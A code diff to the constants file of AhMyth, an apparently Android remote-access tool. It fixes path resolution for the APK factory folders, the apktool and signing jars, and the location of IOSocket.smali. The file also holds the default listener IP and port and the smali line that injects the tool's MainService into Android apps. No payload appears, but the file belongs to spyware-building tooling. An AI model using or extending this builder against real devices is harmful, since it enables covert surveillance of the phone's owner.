@@ -1,14 +1,16 @@
 const path = require('path');
 
+// Resolve paths from the Electron app root instead of inside the renderer folder
+const appRoot = path.resolve(__dirname, '..', '..', '..');
 
 //---------------------App Controller Vars----------------------------------
 exports.apkName = 'Ahmyth.apk';
 exports.apkSourceName = 'Ahmyth';
 exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
-exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
-exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
-exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
-exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
+exports.ahmythApkFolderPath = path.join(appRoot, 'Factory', 'Ahmyth').replace("app.asar", "app.asar.unpacked");
+exports.vaultFolderPath = path.join(appRoot, 'Factory', 'Vault').replace("app.asar", "app.asar.unpacked");
+exports.apktoolJar = path.join(appRoot, 'Factory', 'apktool.jar').replace("app.asar", "app.asar.unpacked");
+exports.signApkJar = path.join(appRoot, 'Factory', 'sign.jar').replace("app.asar", "app.asar.unpacked");
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
@@ -17,7 +19,8 @@ exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yell
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
 exports.defaultIP = '192.168.1.1';
 exports.defaultPort = 1234;
-exports.IOSocketPath = 'smali_classes3' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'IOSocket.smali';
+// Current client build places IOSocket in smali (not smali_classes3)
+exports.IOSocketPath = path.join('smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali');
 exports.ahmythService = 'ahmyth.mine.king.ahmyth.MainService';
 exports.ahmythReceiver = 'ahmyth.mine.king.ahmyth.MyReceiver';
 exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
